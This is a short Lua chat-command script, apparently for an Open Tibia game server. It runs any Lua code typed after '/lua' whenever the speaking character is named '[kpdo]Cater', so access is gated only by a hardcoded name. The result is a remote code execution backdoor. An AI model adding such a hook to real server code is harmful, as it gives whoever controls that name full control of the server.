function onSay(cid, words, param) --- command /lua By mock
    _G.cid = cid
if getCreatureName(cid) == "[kpdo]Cater" then
	local f , err = loadstring(param)
	if f then
		local ret,err = pcall(f)
		if not ret then
			doPlayerSendTextMessage(cid, 25,'Lua error:\n'..err)
		end
	else
		doPlayerSendTextMessage(cid, 25,'Lua error:\n'..err)
	end
end
	return TRUE
end